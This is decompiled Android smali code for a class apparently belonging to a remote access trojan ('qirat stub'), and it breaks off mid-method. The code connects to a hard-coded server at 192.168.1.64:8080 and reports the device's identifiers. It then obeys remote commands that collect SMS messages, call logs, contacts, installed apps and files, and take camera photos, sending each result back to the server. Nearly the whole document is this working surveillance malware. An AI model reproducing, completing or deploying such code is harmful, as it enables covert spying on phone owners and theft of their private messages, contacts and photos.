.class public Lcom/qirat/stub/Socket;
.super Ljava/lang/Object;
.source "Socket.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/qirat/stub/Socket$OnDataReceivedListener;
    }
.end annotation


# static fields
.field private static SERVER_IP:Ljava/lang/String; = null

.field private static SERVER_PORT:I = 0x0

.field private static final TAG:Ljava/lang/String; = "SocketManager"

.field private static volatile instance:Lcom/qirat/stub/Socket;


# instance fields
.field private context:Landroid/content/Context;

.field private dataListener:Lcom/qirat/stub/Socket$OnDataReceivedListener;

.field private isConnected:Z

.field private reader:Ljava/io/BufferedReader;

.field private receiverThread:Ljava/lang/Thread;

.field private tcpSocket:Ljava/net/Socket;

.field private writer:Ljava/io/PrintWriter;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 23
    const-string v0, "192.168.1.64"

    sput-object v0, Lcom/qirat/stub/Socket;->SERVER_IP:Ljava/lang/String;

    .line 24
    const/16 v0, 0x1f90

    sput v0, Lcom/qirat/stub/Socket;->SERVER_PORT:I

    return-void
.end method

.method private constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 42
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    .line 43
    return-void
.end method

.method public static getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .line 49
    sget-object v0, Lcom/qirat/stub/Socket;->instance:Lcom/qirat/stub/Socket;

    if-nez v0, :cond_1

    .line 50
    const-class v0, Lcom/qirat/stub/Socket;

    monitor-enter v0

    .line 51
    :try_start_0
    sget-object v1, Lcom/qirat/stub/Socket;->instance:Lcom/qirat/stub/Socket;

    if-nez v1, :cond_0

    .line 52
    new-instance v1, Lcom/qirat/stub/Socket;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v1, v2}, Lcom/qirat/stub/Socket;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/qirat/stub/Socket;->instance:Lcom/qirat/stub/Socket;

    .line 54
    :cond_0
    monitor-exit v0

    goto :goto_0

    :catchall_0
    move-exception v1

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw v1

    .line 56
    :cond_1
    :goto_0
    sget-object v0, Lcom/qirat/stub/Socket;->instance:Lcom/qirat/stub/Socket;

    return-object v0
.end method

.method private processCommand(Ljava/lang/String;)V
    .locals 9
    .param p1, "command"    # Ljava/lang/String;

    .line 212
    const-string v0, ":"

    const-string v1, "SocketManager"

    if-eqz p1, :cond_5

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    goto/16 :goto_7

    .line 215
    :cond_0
    const/4 v2, 0x2

    invoke-virtual {p1, v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v3

    .line 216
    .local v3, "parts":[Ljava/lang/String;
    const/4 v4, 0x0

    aget-object v5, v3, v4

    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    .line 217
    .local v5, "cmd":Ljava/lang/String;
    array-length v6, v3

    const/4 v7, 0x1

    if-le v6, v7, :cond_1

    aget-object v6, v3, v7

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    goto :goto_0

    :cond_1
    const-string v6, ""

    .line 219
    .local v6, "param":Ljava/lang/String;
    :goto_0
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v8

    sparse-switch v8, :sswitch_data_0

    :cond_2
    goto :goto_1

    :sswitch_0
    const-string v2, "getFiles"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x6

    goto :goto_2

    :sswitch_1
    const-string v2, "getCalls"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v7

    goto :goto_2

    :sswitch_2
    const-string v8, "getContacts"

    invoke-virtual {v5, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_2

    goto :goto_2

    :sswitch_3
    const-string v2, "downloadFile"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x7

    goto :goto_2

    :sswitch_4
    const-string v2, "getCams"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x4

    goto :goto_2

    :sswitch_5
    const-string v2, "getApps"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x3

    goto :goto_2

    :sswitch_6
    const-string v2, "getSms"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v4

    goto :goto_2

    :sswitch_7
    const-string v2, "takePic"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x5

    goto :goto_2

    :goto_1
    const/4 v2, -0x1

    :goto_2
    packed-switch v2, :pswitch_data_0

    .line 258
    goto/16 :goto_4

    .line 253
    :pswitch_0
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_4

    .line 254
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0, v6}, Lcom/qirat/stub/FileManager;->downloadFile(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_5

    .line 248
    :pswitch_1
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_4

    .line 249
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0, v6}, Lcom/qirat/stub/FileManager;->sendWalkResultToServer(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_5

    .line 236
    :pswitch_2
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v2, :cond_4

    .line 238
    :try_start_1
    invoke-virtual {v6, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 239
    .local v0, "camParts":[Ljava/lang/String;
    aget-object v2, v0, v4

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    .line 240
    .local v2, "camId":I
    array-length v4, v0

    if-le v4, v7, :cond_3

    aget-object v4, v0, v7

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    goto :goto_3

    :cond_3
    const/16 v4, 0x32

    .line 241
    .local v4, "camQuality":I
    :goto_3
    new-instance v7, Lcom/qirat/stub/CameraManager;

    iget-object v8, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-direct {v7, v8}, Lcom/qirat/stub/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v7, v2, v4}, Lcom/qirat/stub/CameraManager;->takePhoto(II)V
    :try_end_1
    .catch Ljava/lang/NumberFormatException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 244
    .end local v0    # "camParts":[Ljava/lang/String;
    .end local v2    # "camId":I
    .end local v4    # "camQuality":I
    goto :goto_5

    .line 242
    :catch_0
    move-exception v0

    .line 243
    .local v0, "e":Ljava/lang/NumberFormatException;
    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Invalid camera params: "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 244
    nop

    .end local v0    # "e":Ljava/lang/NumberFormatException;
    goto :goto_5

    .line 233
    :pswitch_3
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/qirat/stub/CameraManager;->sendCameraListToServer(Landroid/content/Context;)V

    .line 234
    goto :goto_5

    .line 230
    :pswitch_4
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/qirat/stub/ApplicationManager;->sendApplicationsListToServer(Landroid/content/Context;)V

    .line 231
    goto :goto_5

    .line 227
    :pswitch_5
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/qirat/stub/ContactsManager;->sendContactsToServer(Landroid/content/Context;)V

    .line 228
    goto :goto_5

    .line 224
    :pswitch_6
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/qirat/stub/CallsManager;->sendCallLogsToServer(Landroid/content/Context;)V

    .line 225
    goto :goto_5

    .line 221
    :pswitch_7
    iget-object v0, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/qirat/stub/SMSManager;->sendSMSListToServer(Landroid/content/Context;)V

    .line 222
    goto :goto_5

    .line 258
    :goto_4
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Unknown command: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 262
    .end local v3    # "parts":[Ljava/lang/String;
    .end local v5    # "cmd":Ljava/lang/String;
    .end local v6    # "param":Ljava/lang/String;
    :cond_4
    :goto_5
    goto :goto_6

    .line 260
    :catch_1
    move-exception v0

    .line 261
    .local v0, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Command processing error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 263
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_6
    return-void

    .line 212
    :cond_5
    :goto_7
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x5c141c7d -> :sswitch_7
        -0x4a7791dd -> :sswitch_6
        -0x482cd18 -> :sswitch_5
        -0x4821d06 -> :sswitch_4
        0x4214ae24 -> :sswitch_3
        0x5a079dc9 -> :sswitch_2
        0x743e781f -> :sswitch_1
        0x746c60c1 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private reconnect()V
    .locals 2

    .line 288
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda1;-><init>(Lcom/qirat/stub/Socket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 296
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 297
    return-void
.end method

.method private sendDeviceInfo()V
    .locals 5

    .line 132
    const-string v0, "SocketManager"

    :try_start_0
    iget-object v1, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    .line 133
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    .line 132
    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 137
    .local v1, "deviceID":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "model="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&manf="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&release="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 142
    .local v2, "deviceInfo":Ljava/lang/String;
    invoke-virtual {p0, v2}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    .line 143
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Device info sent: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 146
    nop

    .end local v1    # "deviceID":Ljava/lang/String;
    .end local v2    # "deviceInfo":Ljava/lang/String;
    goto :goto_0

    .line 144
    :catch_0
    move-exception v1

    .line 145
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to send device info: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 147
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method private sendInitialData()V
    .locals 2

    .line 153
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda0;-><init>(Lcom/qirat/stub/Socket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 180
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 181
    return-void
.end method

.method private startHeartbeat()V
    .locals 2

    .line 115
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda5;

    invoke-direct {v1, p0}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda5;-><init>(Lcom/qirat/stub/Socket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 124
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 125
    return-void
.end method

.method private startReceiving()V
    .locals 2

    .line 187
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda2;-><init>(Lcom/qirat/stub/Socket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/qirat/stub/Socket;->receiverThread:Ljava/lang/Thread;

    .line 204
    iget-object v0, p0, Lcom/qirat/stub/Socket;->receiverThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 205
    return-void
.end method


# virtual methods
.method public connect()V
    .locals 2

    .line 63
    iget-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    if-eqz v0, :cond_0

    .line 64
    const-string v0, "SocketManager"

    const-string v1, "Already connected."

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 65
    return-void

    .line 68
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda4;

    invoke-direct {v1, p0}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda4;-><init>(Lcom/qirat/stub/Socket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 107
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 108
    return-void
.end method

.method public disconnect()V
    .locals 4

    .line 303
    const-string v0, "SocketManager"

    const/4 v1, 0x0

    iput-boolean v1, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 305
    :try_start_0
    iget-object v1, p0, Lcom/qirat/stub/Socket;->writer:Ljava/io/PrintWriter;

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/qirat/stub/Socket;->writer:Ljava/io/PrintWriter;

    invoke-virtual {v1}, Ljava/io/PrintWriter;->close()V

    .line 306
    :cond_0
    iget-object v1, p0, Lcom/qirat/stub/Socket;->reader:Ljava/io/BufferedReader;

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/qirat/stub/Socket;->reader:Ljava/io/BufferedReader;

    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V

    .line 307
    :cond_1
    iget-object v1, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    .line 308
    :cond_2
    const-string v1, "Disconnected from server"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 311
    goto :goto_0

    .line 309
    :catch_0
    move-exception v1

    .line 310
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Disconnect error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 312
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public getTcpSocket()Ljava/net/Socket;
    .locals 1

    .line 332
    iget-object v0, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    return-object v0
.end method

.method public isConnected()Z
    .locals 1

    .line 318
    iget-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method synthetic lambda$connect$0$com-qirat-stub-Socket()V
    .locals 5

    .line 70
    const-string v0, "SocketManager"

    :try_start_0
    const-string v1, "=== STARTING CONNECTION ATTEMPT ==="

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 71
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Target: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lcom/qirat/stub/Socket;->SERVER_IP:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, Lcom/qirat/stub/Socket;->SERVER_PORT:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Android Version: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 74
    new-instance v1, Ljava/net/Socket;

    invoke-direct {v1}, Ljava/net/Socket;-><init>()V

    iput-object v1, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    .line 75
    iget-object v1, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    new-instance v2, Ljava/net/InetSocketAddress;

    sget-object v3, Lcom/qirat/stub/Socket;->SERVER_IP:Ljava/lang/String;

    sget v4, Lcom/qirat/stub/Socket;->SERVER_PORT:I

    invoke-direct {v2, v3, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    const/16 v3, 0x2710

    invoke-virtual {v1, v2, v3}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 77
    const-string v1, "TCP socket connected successfully!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    new-instance v1, Ljava/io/PrintWriter;

    new-instance v2, Ljava/io/BufferedWriter;

    new-instance v3, Ljava/io/OutputStreamWriter;

    iget-object v4, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    .line 80
    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    const/4 v3, 0x1

    invoke-direct {v1, v2, v3}, Ljava/io/PrintWriter;-><init>(Ljava/io/Writer;Z)V

    iput-object v1, p0, Lcom/qirat/stub/Socket;->writer:Ljava/io/PrintWriter;

    .line 81
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    iget-object v4, p0, Lcom/qirat/stub/Socket;->tcpSocket:Ljava/net/Socket;

    .line 82
    invoke-virtual {v4}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {v2, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    iput-object v1, p0, Lcom/qirat/stub/Socket;->reader:Ljava/io/BufferedReader;

    .line 84
    iput-boolean v3, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 85
    const-string v1, "Streams initialized. Connection established!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 88
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->sendDeviceInfo()V

    .line 91
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->sendInitialData()V

    .line 94
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->startHeartbeat()V

    .line 97
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->startReceiving()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 106
    goto :goto_0

    .line 99
    :catch_0
    move-exception v1

    .line 100
    .local v1, "e":Ljava/lang/Exception;
    const-string v2, "=== CONNECTION FAILED ==="

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 101
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " - "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 102
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 103
    const/4 v0, 0x0

